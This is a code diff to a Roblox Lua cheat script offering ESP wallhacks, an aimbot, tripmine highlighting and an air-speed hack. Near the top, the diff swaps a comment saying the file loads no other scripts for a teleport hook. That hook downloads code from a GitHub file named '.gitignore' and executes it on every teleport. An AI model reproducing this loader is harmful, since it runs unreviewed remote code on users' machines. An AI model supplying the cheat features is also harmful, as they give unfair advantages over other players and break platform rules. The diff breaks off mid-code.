@@ -1,6 +1,11 @@
 --// VISION HUD ESP & AIMBOT (XENO & AUTO-EXECUTE SUPPORT)
 --// LocalScript -> StarterPlayerScripts / StarterGui
 
+if getgenv().VisionHUD_Loaded then
+    return
+end
+getgenv().VisionHUD_Loaded = true
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
@@ -13,11 +18,19 @@ local Camera = workspace.CurrentCamera
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 --------------------------------------------------
--- XENO COMPATIBILITY
--- ВАЖНО: этот файл НЕ загружает никакие другие скрипты.
--- GitHub loader находится отдельно.
+-- AUTO TELEPORT QUEUE & XENO COMPATIBILITY
 --------------------------------------------------
+local queueOnTeleport = queue_on_teleport or (syn and syn.queue_on_teleport) or queueonteleport
 local mouseMoveRel = mousemoverel or (Input and Input.MouseMoveRel)
+
+if queueOnTeleport then
+    LocalPlayer.OnTeleport:Connect(function()
+        pcall(queueOnTeleport, [[
+            if not game:IsLoaded() then game.Loaded:Wait() end
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/nnuulllo/null/refs/heads/main/.gitignore"))()
+        ]])
+    end)
+end
 
 --------------------------------------------------
 -- CONFIGURATION & FILE SYSTEM
@@ -35,19 +48,37 @@ local CONFIG = {
     ShowNames = true,
     ShowWeapon = true,
     ShowHighlight = true,
-    MaxDistance = 1000,
     AnimationSpeed = 30,
 
-    -- Box & Fill Customization
+    -- Object ESP
+    ObjectESPEnabled = true,
+    TripmineESP = true,
+    ObjectShowBoxes = true,
+    ObjectShowNames = true,
+    ObjectShowHighlight = true,
+
+    -- Movement
+    InstantMovement = false,
+
+    -- ESP Customization
     BoxFillEnabled = true,
     BoxColor = Color3.fromRGB(255, 255, 255),
     BoxThickness = 1.5,
     FillColor = Color3.fromRGB(255, 70, 70),
     FillTransparency = 0.65,
+    ESPGradientEnabled = true,
+    ESPGradientRotation = 90,
+    ESPGradientColor1 = Color3.fromRGB(255, 70, 70),
+    ESPGradientColor2 = Color3.fromRGB(255, 170, 60),
 
-    -- ESP Gradient Customization
-    UseGradient = false,
-    GradientRotation = 90,
+    -- Object ESP Customization
+    ObjectBoxThickness = 1.5,
+    ObjectFillEnabled = true,
+    ObjectFillTransparency = 0.65,
+    ObjectGradientEnabled = true,
+    ObjectGradientRotation = 90,
+    ObjectGradientColor1 = Color3.fromRGB(80, 160, 255),
+    ObjectGradientColor2 = Color3.fromRGB(180, 90, 255),
 
     -- UI Main Frame Gradient & Transparency
     UIGradientEnabled = true,
@@ -69,6 +100,7 @@ local CONFIG = {
     NameColor = Color3.fromRGB(255, 255, 255),
     WeaponColor = Color3.fromRGB(255, 215, 0),
     DistanceColor = Color3.fromRGB(190, 190, 190),
+    TripmineColor = Color3.fromRGB(255, 80, 80),
 
     -- Highlight Customization
     HighlightDepthMode = Enum.HighlightDepthMode.AlwaysOnTop,
@@ -556,7 +588,7 @@ MenuTitle.Size = UDim2.new(1, -20, 1, 0)
 MenuTitle.Position = UDim2.new(0, 12, 0, 0)
 MenuTitle.BackgroundTransparency = 1
 MenuTitle.Font = Enum.Font.GothamBold
-MenuTitle.Text = "VISION HUD // XENO & WORLD VISUALS"
+MenuTitle.Text = "VISION HUD // ESP"
 MenuTitle.TextColor3 = Color3.fromRGB(220, 220, 235)
 MenuTitle.TextSize = 11
 MenuTitle.TextXAlignment = Enum.TextXAlignment.Left
@@ -892,7 +924,7 @@ end)
 --------------------------------------------------
 
 local Sidebar = Instance.new("Frame")
-Sidebar.Size = UDim2.new(0, 120, 1, -35)
+Sidebar.Size = UDim2.new(0, 135, 1, -35)
 Sidebar.Position = UDim2.new(0, 0, 0, 35)
 Sidebar.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
 Sidebar.BackgroundTransparency = 0.4
@@ -901,8 +933,8 @@ Sidebar.ZIndex = 5
 Sidebar.Parent = BackgroundFrame
 
 local TabContainer = Instance.new("Frame")
-TabContainer.Size = UDim2.new(1, -130, 1, -45)
-TabContainer.Position = UDim2.new(0, 125, 0, 40)
+TabContainer.Size = UDim2.new(1, -145, 1, -45)
+TabContainer.Position = UDim2.new(0, 140, 0, 40)
 TabContainer.BackgroundTransparency = 1
 TabContainer.ZIndex = 5
 TabContainer.Parent = BackgroundFrame
@@ -942,12 +974,14 @@ local function CreateTabBtn(text, pos)
     return btn
 end
 
-local ESPMainBtn = CreateTabBtn("ESP MAIN", 8)
-local ESPStyleBtn = CreateTabBtn("BOX & GRADIENT", 40)
-local WorldBtn = CreateTabBtn("WORLD VISUALS", 72)
-local ColorsBtn = CreateTabBtn("COLORS & TEXT", 104)
-local AimTabBtn = CreateTabBtn("AIMBOT", 136)
-local ConfigTabBtn = CreateTabBtn("CONFIGS", 168)
+local ESPMainBtn = CreateTabBtn("PLAYERS", 8)
+local ObjectsBtn = CreateTabBtn("OBJECTS", 42)
+local MovementBtn = CreateTabBtn("MOVEMENT", 76)
+local ESPStyleBtn = CreateTabBtn("VISUALS", 110)
+local WorldBtn = CreateTabBtn("WORLD", 144)
+local ColorsBtn = CreateTabBtn("COLORS", 178)
+local AimTabBtn = CreateTabBtn("AIM", 212)
+local ConfigTabBtn = CreateTabBtn("SETTINGS", 246)
 
 local function CreatePage()
     local page = Instance.new("ScrollingFrame")
@@ -969,6 +1003,8 @@ local function CreatePage()
 end
 
 local ESPMainPage = CreatePage()
+local ObjectsPage = CreatePage()
+local MovementPage = CreatePage()
 local ESPStylePage = CreatePage()
 local WorldPage = CreatePage()
 local ColorsPage = CreatePage()
@@ -977,6 +1013,8 @@ local ConfigPage = CreatePage()
 
 local function SwitchTab(targetPage, targetBtn)
     ESPMainPage.Visible = false
+    ObjectsPage.Visible = false
+    MovementPage.Visible = false
     ESPStylePage.Visible = false
     WorldPage.Visible = false
     ColorsPage.Visible = false
@@ -995,6 +1033,8 @@ local function SwitchTab(targetPage, targetBtn)
 end
 
 ESPMainBtn.MouseButton1Click:Connect(function() SwitchTab(ESPMainPage, ESPMainBtn) end)
+ObjectsBtn.MouseButton1Click:Connect(function() SwitchTab(ObjectsPage, ObjectsBtn) end)
+MovementBtn.MouseButton1Click:Connect(function() SwitchTab(MovementPage, MovementBtn) end)
 ESPStyleBtn.MouseButton1Click:Connect(function() SwitchTab(ESPStylePage, ESPStyleBtn) end)
 WorldBtn.MouseButton1Click:Connect(function() SwitchTab(WorldPage, WorldBtn) end)
 ColorsBtn.MouseButton1Click:Connect(function() SwitchTab(ColorsPage, ColorsBtn) end)
@@ -1552,31 +1592,139 @@ local function BuildConfigTab(parent)
 end
 
 --------------------------------------------------
+-- INSTANT AIR MOVEMENT
+--------------------------------------------------
+
+local function GetLocalHumanoid()
+    local character = LocalPlayer.Character
+    if not character then return nil end
+    return character:FindFirstChildOfClass("Humanoid")
+end
+
+local airMomentumSpeed = 0
+local lastGroundSpeed = 0
+
+local function ResetAirMovement()
+    airMomentumSpeed = 0
+    lastGroundSpeed = 0
+end
+
+local function ApplyInstantMovement()
+    local humanoid = GetLocalHumanoid()
+    if not humanoid or humanoid.Health <= 0 then
+        ResetAirMovement()
+        return
+    end
+
+    local rootPart = humanoid.RootPart or humanoid.Parent:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return end
+
+    -- The feature is intentionally active ONLY while airborne.
+    local state = humanoid:GetState()
+    local airborne = humanoid.FloorMaterial == Enum.Material.Air
+        and state ~= Enum.HumanoidStateType.Dead
+        and state ~= Enum.HumanoidStateType.Seated
+        and state ~= Enum.HumanoidStateType.PlatformStanding
+
+    local velocity = rootPart.AssemblyLinearVelocity
+    local horizontalVelocity = Vector3.new(velocity.X, 0, velocity.Z)
+    local currentSpeed = horizontalVelocity.Magnitude
+    local moveDirection = humanoid.MoveDirection
+
+    if not airborne then
+        -- Learn the real speed on the ground so the first airborne frame
+        -- starts from the speed the character actually had.
+        if currentSpeed > lastGroundSpeed then
+            lastGroundSpeed = currentSpeed
+        end
+        airMomentumSpeed = math.max(airMomentumSpeed, currentSpeed)
+        return
+    end
+
+    if moveDirection.Magnitude <= 0.001 then
+        -- No input: do not touch horizontal velocity.
+        airMomentumSpeed = math.max(airMomentumSpeed, currentSpeed)
+        return
+    end
+
+    -- Never lower the player's existing horizontal speed.
+    -- The cached value only remembers speed already reached; it is never
+    -- replaced by a lower value when the player turns/strafe/backpedals.
+    airMomentumSpeed = math.max(airMomentumSpeed, lastGroundSpeed, currentSpeed)
+
+    local targetSpeed = airMomentumSpeed
+    local targetVelocity = moveDirection.Unit * targetSpeed
+
+    rootPart.AssemblyLinearVelocity = Vector3.new(
+        targetVelocity.X,
+        velocity.Y,
+        targetVelocity.Z
+    )
+
+    -- If physics gave the player more speed, keep that higher value.
+    local newHorizontal = Vector3.new(
+        rootPart.AssemblyLinearVelocity.X,
+        0,
+        rootPart.AssemblyLinearVelocity.Z
+    )
+    airMomentumSpeed = math.max(airMomentumSpeed, newHorizontal.Magnitude)
+end
+
+LocalPlayer.CharacterAdded:Connect(function(character)
+    ResetAirMovement()
+    character:WaitForChild("Humanoid", 5)
+    character:WaitForChild("HumanoidRootPart", 5)
+end)
+
+-- Run before each physics step so air direction changes happen instantly.
+RunService.Stepped:Connect(function()
+    if CONFIG.InstantMovement then
+        ApplyInstantMovement()
+    end
+end)
+
+--------------------------------------------------
 -- INITIALIZE CONTROLS
 --------------------------------------------------
 
-CreateToggle(ESPMainPage, "Master ESP Toggle", "ESPEnabled")
+CreateToggle(ESPMainPage, "Enable Player ESP", "ESPEnabled")
 CreateToggle(ESPMainPage, "Show Boxes", "ShowBoxes")
-CreateToggle(ESPMainPage, "Show Health Bars", "ShowHealth")
-CreateToggle(ESPMainPage, "Show Names & Distance", "ShowNames")
-CreateToggle(ESPMainPage, "Show Weapon & Skin", "ShowWeapon")
-CreateToggle(ESPMainPage, "Show Highlight (Chams)", "ShowHighlight")
-CreateSlider(ESPMainPage, "Max Distance", 100, 3000, "MaxDistance")
+CreateToggle(ESPMainPage, "Show Health", "ShowHealth")
+CreateToggle(ESPMainPage, "Show Names", "ShowNames")
+CreateToggle(ESPMainPage, "Show Weapon", "ShowWeapon")
+CreateToggle(ESPMainPage, "Highlight Players", "ShowHighlight")
 
-CreateToggle(ESPStylePage, "Enable Box Fill", "BoxFillEnabled")
-CreateToggle(ESPStylePage, "Enable Box Gradient", "UseGradient")
-CreateSlider(ESPStylePage, "Fill Transparency", 0, 1, "FillTransparency")
-CreateSlider(ESPStylePage, "Box Thickness", 1, 5, "BoxThickness")
-CreateToggle(ESPStylePage, "Enable UI Gradient", "UIGradientEnabled", function() UpdateUIGradient() end)
-CreateSlider(ESPStylePage, "UI Gradient Rotation", 0, 360, "UIGradientRotation", function() UpdateUIGradient() end)
-CreateSlider(ESPStylePage, "UI Background Transparency", 0, 1, "UITransparency", function() UpdateUIGradient() end)
+CreateToggle(ObjectsPage, "Enable Object ESP", "ObjectESPEnabled")
+CreateToggle(ObjectsPage, "Subspace Tripmine", "TripmineESP")
+CreateToggle(ObjectsPage, "Object Boxes", "ObjectShowBoxes")
+CreateToggle(ObjectsPage, "Object Names", "ObjectShowNames")
+CreateToggle(ObjectsPage, "Highlight Objects", "ObjectShowHighlight")
+CreateToggle(ObjectsPage, "Object Fill", "ObjectFillEnabled")
+CreateToggle(ObjectsPage, "Object Gradient", "ObjectGradientEnabled")
+CreateSlider(ObjectsPage, "Object Fill Transparency", 0, 1, "ObjectFillTransparency")
+CreateSlider(ObjectsPage, "Object Border Thickness", 1, 5, "ObjectBoxThickness")
+CreateSlider(ObjectsPage, "Object Gradient Rotation", 0, 360, "ObjectGradientRotation")
+
+-- Movement
+CreateToggle(MovementPage, "Instant Air Movement", "InstantMovement", function()
+    ApplyInstantMovement()
+end)
+
+CreateToggle(ESPStylePage, "ESP Fill", "BoxFillEnabled")
+CreateToggle(ESPStylePage, "ESP Gradient", "ESPGradientEnabled")
+CreateSlider(ESPStylePage, "ESP Fill Transparency", 0, 1, "FillTransparency")
+CreateSlider(ESPStylePage, "ESP Border Thickness", 1, 5, "BoxThickness")
+CreateSlider(ESPStylePage, "ESP Gradient Rotation", 0, 360, "ESPGradientRotation")
+CreateToggle(ESPStylePage, "Menu Gradient", "UIGradientEnabled", function() UpdateUIGradient() end)
+CreateSlider(ESPStylePage, "Gradient Rotation", 0, 360, "UIGradientRotation", function() UpdateUIGradient() end)
+CreateSlider(ESPStylePage, "Menu Transparency", 0, 1, "UITransparency", function() UpdateUIGradient() end)
 
 -- World Lighting, Atmosphere & Graphics Controls
-CreateToggle(WorldPage, "World Lighting Fog", "WorldFogEnabled", function() UpdateWorldVisuals() end)
+CreateToggle(WorldPage, "Fog", "WorldFogEnabled", function() UpdateWorldVisuals() end)
 CreateSlider(WorldPage, "Fog Distance", 50, 5000, "WorldFogDistance", function() UpdateWorldVisuals() end)
-CreateToggle(WorldPage, "World Atmosphere", "WorldAtmosphereEnabled", function() UpdateWorldVisuals() end)
+CreateToggle(WorldPage, "Atmosphere", "WorldAtmosphereEnabled", function() UpdateWorldVisuals() end)
 CreateSlider(WorldPage, "Atmosphere Density", 0, 1, "WorldAtmosphereDensity", function() UpdateWorldVisuals() end)
-CreateToggle(WorldPage, "Off Other ViewModels (Parts, Decals, Textures)", "HideOtherViewModels", function(state)
+CreateToggle(WorldPage, "Hide Other ViewModels", "HideOtherViewModels", function(state)
     local vmFolder = workspace:FindFirstChild("ViewModels")
     if vmFolder then
         for _, child in ipairs(vmFolder:GetChildren()) do
@@ -1589,6 +1737,10 @@ CreateColorPicker(ColorsPage, "UI Gradient Color 1", "UIGradientColor1")
 CreateColorPicker(ColorsPage, "UI Gradient Color 2", "UIGradientColor2")
 CreateColorPicker(ColorsPage, "Box Border Color", "BoxColor")
 CreateColorPicker(ColorsPage, "Box Fill Color", "FillColor")
+CreateColorPicker(ColorsPage, "ESP Gradient Color 1", "ESPGradientColor1")
+CreateColorPicker(ColorsPage, "ESP Gradient Color 2", "ESPGradientColor2")
+CreateColorPicker(ColorsPage, "Object Gradient Color 1", "ObjectGradientColor1")
+CreateColorPicker(ColorsPage, "Object Gradient Color 2", "ObjectGradientColor2")
 CreateColorPicker(ColorsPage, "Player Name Color", "NameColor")
 CreateColorPicker(ColorsPage, "Weapon Text Color", "WeaponColor")
 CreateColorPicker(ColorsPage, "Distance Text Color", "DistanceColor")
@@ -1597,14 +1749,14 @@ CreateColorPicker(ColorsPage, "Health Bar BG Color", "HealthBarBg")
 CreateColorPicker(ColorsPage, "FOV Circle Color", "FOVColor")
 
 -- AIMBOT SETTINGS
-CreateToggle(AimPage, "Master Aimbot", "AimEnabled")
-CreateToggle(AimPage, "Team Check (Use TeamID Attribute)", "TeamCheck")
-CreateToggle(AimPage, "Wall Check (Ignore Walls)", "WallCheck")
-CreateKeybind(AimPage, "Aim Activation Key", "AimKey")
+CreateToggle(AimPage, "Enable Aim", "AimEnabled")
+CreateToggle(AimPage, "Team Check", "TeamCheck")
+CreateToggle(AimPage, "Wall Check", "WallCheck")
+CreateKeybind(AimPage, "Aim Key", "AimKey")
 CreateDropdown(AimPage, "Aim Mode", {"Hold", "Toggle", "Always"}, "AimMode")
-CreateDropdown(AimPage, "Aim Target Part", {"Head", "HumanoidRootPart"}, "AimTargetPart")
-CreateToggle(AimPage, "Show FOV Circle", "ShowFOV")
-CreateSlider(AimPage, "FOV Radius", 30, 500, "AimFOV")
+CreateDropdown(AimPage, "Target Part", {"Head", "HumanoidRootPart"}, "AimTargetPart")
+CreateToggle(AimPage, "FOV Circle", "ShowFOV")
+CreateSlider(AimPage, "FOV Size", 30, 500, "AimFOV")
 CreateSlider(AimPage, "Smoothness", 1, 20, "AimSmoothness")
 
 BuildConfigTab(ConfigPage)
@@ -1655,57 +1807,91 @@ local function IsVisible(targetPart, character)
     return true
 end
 
-local function GetPlayerEquippedWeapon(player)
-    -- Сначала ищем ViewModel именно по НИКУ игрока.
-    -- Ожидаемая структура: workspace.ViewModels/<PlayerName>/<Weapon>
+-- Find the ViewModel by the player's nickname first, then resolve the weapon inside it.
+local function FindPlayerViewModel(player)
+    if not player then return nil end
+
     local vmFolder = workspace:FindFirstChild("ViewModels")
-    if not vmFolder then return "None" end
+    if not vmFolder then return nil end
 
+    -- Primary path: ViewModels/<PlayerName>
     local playerViewModel = vmFolder:FindFirstChild(player.Name)
+    if playerViewModel then
+        return playerViewModel
+    end
 
-    -- Если имя не совпало напрямую, пробуем найти ViewModel с атрибутом Player/User/Owner.
-    if not playerViewModel then
-        for _, vm in ipairs(vmFolder:GetChildren()) do
-            local owner = vm:GetAttribute("Player") or vm:GetAttribute("User") or vm:GetAttribute("Owner") or vm:GetAttribute("PlayerName")
-            if owner and tostring(owner) == player.Name then
-                playerViewModel = vm
-                break
-            end
+    -- Fallback for games that store the nickname in an attribute.
+    for _, vm in ipairs(vmFolder:GetChildren()) do
+        local owner = vm:GetAttribute("Player")
+            or vm:GetAttribute("User")
+            or vm:GetAttribute("Owner")
+            or vm:GetAttribute("PlayerName")
+
+        if owner and tostring(owner) == player.Name then
+            return vm
         end
     end
 
-    if not playerViewModel then return "None" end
+    return nil
+end
 
-    -- После проверки ника смотрим оружие внутри ViewModel.
+local function FindWeaponInPlayerViewModel(playerViewModel)
+    if not playerViewModel then return nil end
+
+    -- Prefer a direct Tool/Model representing the weapon.
     local tool = playerViewModel:FindFirstChildOfClass("Tool")
-    local weapon = tool
+    if tool then return tool end
 
-    if not weapon then
-        for _, child in ipairs(playerViewModel:GetChildren()) do
-            if child:IsA("Model") or child:IsA("Tool") then
-                weapon = child
-                break
-            end
+    for _, child in ipairs(playerViewModel:GetChildren()) do
+        if child:IsA("Model") or child:IsA("Tool") then
+            return child
         end
     end
 
-    if not weapon then
-        local nestedTool = playerViewModel:FindFirstChildWhichIsA("Tool", true)
-        if nestedTool then weapon = nestedTool end
+    -- Some ViewModels nest the actual weapon deeper.
+    local nestedTool = playerViewModel:FindFirstChildWhichIsA("Tool", true)
+    if nestedTool then return nestedTool end
+
+    local nestedModel = playerViewModel:FindFirstChildWhichIsA("Model", true)
+    if nestedModel then return nestedModel end
+
+    return nil
+end
+
+local function GetPlayerEquippedWeapon(player)
+    -- 1) Check the player's nickname.
+    local playerViewModel = FindPlayerViewModel(player)
+    if not playerViewModel then
+        return "No Weapon"
     end
 
-    if not weapon then return "None" end
+    -- 2) Only after the nickname matches, inspect that ViewModel's weapon.
+    local weapon = FindWeaponInPlayerViewModel(playerViewModel)
+    if not weapon then
+        return "No Weapon"
+    end
 
-    local fullName = weapon.Name
+    -- Expected naming: Author - Weapon - Skin
+    local fullName = tostring(weapon.Name)
     local splitParts = string.split(fullName, " - ")
 
-    -- Поддержка формата "Автор - Оружие - Скин".
-    local weaponName = splitParts[2] or splitParts[1] or fullName
-    local skinName = splitParts[3]
+    local weaponName
+    local skinName
 
-    if not skinName and weapon.GetAttribute then
-        skinName = weapon:GetAttribute("Skin") or weapon:GetAttribute("SkinName")
+    if #splitParts >= 3 then
+        weaponName = splitParts[2]
+        skinName = splitParts[3]
+    elseif #splitParts == 2 then
+        weaponName = splitParts[2]
+    else
+        weaponName = splitParts[1] or fullName
     end
+
+    pcall(function()
+        if not skinName then
+            skinName = weapon:GetAttribute("Skin") or weapon:GetAttribute("SkinName")
+        end
+    end)
 
     if skinName and tostring(skinName) ~= "" and tostring(skinName) ~= tostring(weaponName) then
         return tostring(weaponName) .. "\n[" .. tostring(skinName) .. "]"
@@ -1713,6 +1899,192 @@ local function GetPlayerEquippedWeapon(player)
 
     return tostring(weaponName)
 end
+
+--------------------------------------------------
+-- OBJECT ESP: SUBSPACE TRIPMINE
+--------------------------------------------------
+
+local OBJECT_TRIPMINE_NAME = "SubspaceTripmineHitbox"
+local ObjectESPCache = {}
+
+local function GetObjectDisplayName(instance)
+    if not instance then return "Object" end
+    if instance.Name == OBJECT_TRIPMINE_NAME then
+        return "Subspace Tripmine"
+    end
+    return instance.Name
+end
+
+local function IsSupportedObject(instance)
+    return instance and instance.Parent and instance.Name == OBJECT_TRIPMINE_NAME
+end
+
+local function GetObjectType(instance)
+    if instance.Name == OBJECT_TRIPMINE_NAME then return "Tripmine" end
+    return "Unknown"
+end
+
+local function GetObjectAnchor(instance)
+    if not instance or not instance.Parent then return nil end
+    if instance:IsA("BasePart") or instance:IsA("Model") then return instance end
+    return instance:FindFirstChildWhichIsA("Model", true)
+        or instance:FindFirstChildWhichIsA("BasePart", true)
+end
+
+local function GetObjectBounds2D(instance)
+    local anchor = GetObjectAnchor(instance)
+    if not anchor then return nil end
+
+    local cf, size
+    if anchor:IsA("Model") then
+        cf, size = anchor:GetBoundingBox()
+    elseif anchor:IsA("BasePart") then
+        cf, size = anchor.CFrame, anchor.Size
+    else
+        return nil
+    end
+
+    local half = size * 0.5
+    local corners = {
+        cf * Vector3.new(-half.X, -half.Y, -half.Z),
+        cf * Vector3.new(-half.X, -half.Y,  half.Z),
+        cf * Vector3.new(-half.X,  half.Y, -half.Z),
+        cf * Vector3.new(-half.X,  half.Y,  half.Z),
+        cf * Vector3.new( half.X, -half.Y, -half.Z),
+        cf * Vector3.new( half.X, -half.Y,  half.Z),
+        cf * Vector3.new( half.X,  half.Y, -half.Z),
+        cf * Vector3.new( half.X,  half.Y,  half.Z),
+    }
+
+    local minX, minY = math.huge, math.huge
+    local maxX, maxY = -math.huge, -math.huge
+    local anyFront = false
+
+    for _, worldPos in ipairs(corners) do
+        local screenPos = Camera:WorldToViewportPoint(worldPos)
+        if screenPos.Z > 0 then
+            anyFront = true
+            minX = math.min(minX, screenPos.X)
+            minY = math.min(minY, screenPos.Y)
+            maxX = math.max(maxX, screenPos.X)
+            maxY = math.max(maxY, screenPos.Y)
+        end
+    end
+
+    if not anyFront or maxX <= minX or maxY <= minY then return nil end
+
+    local viewport = Camera.ViewportSize
+    if maxX < -100 or minX > viewport.X + 100 or maxY < -100 or minY > viewport.Y + 100 then
+        return nil
+    end
+
+    return {
+        Position = Vector2.new(minX, minY),
+        Size = Vector2.new(maxX - minX, maxY - minY),
+        WorldPosition = cf.Position,
+    }
+end
+
+local function HideObjectESP(data)
+    if not data then return end
+    data.Box.Visible = false
+    data.Label.Visible = false
+    data.Highlight.Enabled = false
+end
+
+local function RemoveObjectESP(instance)
+    local data = ObjectESPCache[instance]
+    if not data then return end
+    if data.Box then data.Box:Destroy() end
+    if data.Label then data.Label:Destroy() end
+    if data.Highlight then data.Highlight:Destroy() end
+    ObjectESPCache[instance] = nil
+end
+
+local function CreateObjectESP(instance)
+    if not IsSupportedObject(instance) or ObjectESPCache[instance] then return end
+
+    local box = Instance.new("Frame")
+    box.Name = "ObjectBox"
+    box.BackgroundColor3 = CONFIG.FillColor
+    box.BackgroundTransparency = CONFIG.FillTransparency
+    box.BorderSizePixel = 0
+    box.Visible = false
+    box.ZIndex = 14
+    box.Parent = ScreenGui
+
+    local objectColor = CONFIG.TripmineColor
+
+    local objectGradient = Instance.new("UIGradient")
+    objectGradient.Name = "ObjectGradient"
+    objectGradient.Rotation = CONFIG.ObjectGradientRotation
+    objectGradient.Enabled = CONFIG.ObjectGradientEnabled
+    objectGradient.Color = ColorSequence.new(CONFIG.ObjectGradientColor1, CONFIG.ObjectGradientColor2)
+    objectGradient.Parent = box
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = objectColor
+    stroke.Thickness = CONFIG.ObjectBoxThickness
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    stroke.Parent = box
+
+    local label = Instance.new("TextLabel")
+    label.AnchorPoint = Vector2.new(0.5, 1)
+    label.Position = UDim2.new(0.5, 0, 0, -4)
+    label.Size = UDim2.fromOffset(260, 34)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.GothamBold
+    label.TextSize = 11
+    label.TextColor3 = stroke.Color
+    label.TextStrokeTransparency = 0.35
+    label.TextWrapped = true
+    label.Text = GetObjectDisplayName(instance)
+    label.Visible = false
+    label.ZIndex = 20
+    label.Parent = box
+
+    local highlight = Instance.new("Highlight")
+    highlight.Name = "ObjectHighlight"
+    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    highlight.FillColor = CONFIG.FillColor
+    highlight.FillTransparency = CONFIG.FillTransparency
+    highlight.OutlineColor = stroke.Color
+    highlight.Enabled = false
+    highlight.Adornee = GetObjectAnchor(instance)
+    highlight.Parent = ESPFolder
+
+    ObjectESPCache[instance] = {
+        Instance = instance,
+        Type = GetObjectType(instance),
+        Box = box,
+        Stroke = stroke,
+        Gradient = objectGradient,
+        Label = label,
+        Highlight = highlight,
+    }
+end
+
+local function UpdateObjectCache()
+    for _, instance in ipairs(workspace:GetDescendants()) do
+        if IsSupportedObject(instance) then
+            CreateObjectESP(instance)
+        end
+    end
+end
+
+workspace.DescendantAdded:Connect(function(instance)
+    if IsSupportedObject(instance) then
+        task.defer(CreateObjectESP, instance)
+    end
+end)
+
+workspace.DescendantRemoving:Connect(function(instance)
+    if ObjectESPCache[instance] then
+        RemoveObjectESP(instance)
+    end
+end)
+
+UpdateObjectCache()
 
 --------------------------------------------------
 -- AIMBOT LOGIC & TARGET FINDER
@@ -1816,8 +2188,9 @@ local function CreateESP(player)
     boxFrame.Parent = ScreenGui
 
     local uiGradient = Instance.new("UIGradient")
-    uiGradient.Rotation = CONFIG.GradientRotation
-    uiGradient.Enabled = CONFIG.UseGradient
+    uiGradient.Rotation = CONFIG.ESPGradientRotation
+    uiGradient.Enabled = CONFIG.ESPGradientEnabled
+    uiGradient.Color = ColorSequence.new(CONFIG.ESPGradientColor1, CONFIG.ESPGradientColor2)
     uiGradient.Parent = boxFrame
 
     local boxStroke = Instance.new("UIStroke")
@@ -1988,8 +2361,7 @@ RunService.RenderStepped:Connect(function(dt)
 
                 if hum and targetRoot and hum.Health > 0 then
                     local dist = (Camera.CFrame.Position - targetRoot.Position).Magnitude
-                    if dist <= CONFIG.MaxDistance then
-                        local box2D = GetBoundingBox2D(targetChar)
+                    local box2D = GetBoundingBox2D(targetChar)
                         if box2D then
                             local smooth = 1 - math.exp(-CONFIG.AnimationSpeed * dt)
                             data.CurrentPos = data.CurrentPos and data.CurrentPos:Lerp(box2D.Position, smooth) or box2D.Position
@@ -1999,11 +2371,13 @@ RunService.RenderStepped:Connect(function(dt)
                                 data.Box.Visible = true
                                 data.Box.Position = UDim2.fromOffset(math.floor(data.CurrentPos.X), math.floor(data.CurrentPos.Y))
                                 data.Box.Size = UDim2.fromOffset(math.floor(data.CurrentSize.X), math.floor(data.CurrentSize.Y))
-                                data.Box.BackgroundColor3 = CONFIG.FillColor
+                                data.Box.BackgroundColor3 = CONFIG.ESPGradientEnabled and Color3.fromRGB(255, 255, 255) or CONFIG.FillColor
                                 data.Box.BackgroundTransparency = CONFIG.BoxFillEnabled and CONFIG.FillTransparency or 1
                                 data.BoxStroke.Color = CONFIG.BoxColor
                                 data.BoxStroke.Thickness = CONFIG.BoxThickness
-                                data.Gradient.Enabled = CONFIG.UseGradient
+                                data.Gradient.Enabled = CONFIG.ESPGradientEnabled
+                                data.Gradient.Rotation = CONFIG.ESPGradientRotation
+                                data.Gradient.Color = ColorSequence.new(CONFIG.ESPGradientColor1, CONFIG.ESPGradientColor2)
                             else
                                 data.Box.Visible = false
                             end
@@ -2049,7 +2423,7 @@ RunService.RenderStepped:Connect(function(dt)
                             if CONFIG.ShowHighlight then
                                 data.Highlight.Enabled = true
                                 data.Highlight.Adornee = targetChar
-                                data.Highlight.FillColor = CONFIG.FillColor
+                                data.Highlight.FillColor = CONFIG.ESPGradientEnabled and CONFIG.ESPGradientColor1 or CONFIG.FillColor
                                 data.Highlight.FillTransparency = CONFIG.FillTransparency
                                 data.Highlight.OutlineColor = CONFIG.BoxColor
                                 data.Highlight.DepthMode = CONFIG.HighlightDepthMode
@@ -2059,9 +2433,6 @@ RunService.RenderStepped:Connect(function(dt)
                         else
                             HideESP(data)
                         end
-                    else
-                        HideESP(data)
-                    end
                 else
                     HideESP(data)
                 end
@@ -2070,6 +2441,58 @@ RunService.RenderStepped:Connect(function(dt)
             end
         else
             HideESP(data)
+        end
+    end
+
+    -- 4. OBJECT ESP PROCESSING
+    for instance, data in pairs(ObjectESPCache) do
+        local typeEnabled = (data.Type == "Tripmine" and CONFIG.TripmineESP)
+
+        if CONFIG.ObjectESPEnabled and typeEnabled and instance.Parent then
+            local anchor = GetObjectAnchor(instance)
+            if anchor and anchor:IsDescendantOf(workspace) then
+                local bounds = GetObjectBounds2D(instance)
+                if bounds then
+                    local objectColor = CONFIG.TripmineColor
+
+                    data.Stroke.Color = objectColor
+                    data.Stroke.Thickness = CONFIG.ObjectBoxThickness
+                    data.Label.TextColor3 = objectColor
+                    data.Label.Text = GetObjectDisplayName(instance)
+                    data.Gradient.Enabled = CONFIG.ObjectGradientEnabled
+                    data.Gradient.Rotation = CONFIG.ObjectGradientRotation
+                    data.Gradient.Color = ColorSequence.new(CONFIG.ObjectGradientColor1, CONFIG.ObjectGradientColor2)
+
+                    if CONFIG.ObjectShowBoxes then
+                        data.Box.Visible = true
+                        data.Box.Position = UDim2.fromOffset(math.floor(bounds.Position.X), math.floor(bounds.Position.Y))
+                        data.Box.Size = UDim2.fromOffset(math.max(2, math.floor(bounds.Size.X)), math.max(2, math.floor(bounds.Size.Y)))
+                        data.Box.BackgroundColor3 = CONFIG.ObjectGradientEnabled and Color3.fromRGB(255, 255, 255) or CONFIG.FillColor
+                        data.Box.BackgroundTransparency = CONFIG.ObjectFillEnabled and CONFIG.ObjectFillTransparency or 1
+                    else
+                        data.Box.Visible = false
+                    end
+
+                    data.Label.Visible = CONFIG.ObjectShowNames
+
+                    if CONFIG.ObjectShowHighlight then
+                        data.Highlight.Adornee = anchor
